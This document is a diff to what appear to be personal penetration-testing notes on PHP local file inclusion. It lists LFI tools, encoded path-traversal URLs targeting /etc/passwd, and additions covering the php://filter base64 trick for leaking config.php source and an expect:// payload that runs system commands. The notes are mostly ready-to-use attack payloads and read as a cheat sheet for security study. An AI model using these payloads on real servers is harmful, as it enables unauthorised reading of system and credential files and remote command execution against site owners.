@@ -1,4 +1,6 @@
 
+https://rawsec.ml/en/local-file-inclusion-remote-code-execution-vulnerability/
+
 tools - dotdotpwn
 lfisuite tool from github 
 A interesting tool to exploit this vulnerability: https://github.com/kurobeats/fimap    
@@ -42,6 +44,22 @@ http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 
+
+
+php://filter#
+You found a LFI, you included the file but you can't see its content?
+
+Some file like config.php or libraries of functions are only executed but not shown. So to help us show them, we can use some PHP wrappers.
+
+A famous one is index.php?page=php://filter/read=convert.base64-encode/resource=config, this filter will encode the page in base64 and show the result like if we have done index.php?page=config and then base64 it.
+
+
+
+expect://#
+A rare but very useful wrapper is expect://, it allows execution of system commands via php. But it is not enabled by default, an extension needs to be installed.
+
+1
+http://example.com/index.php?file=expect://ls
 
 
 
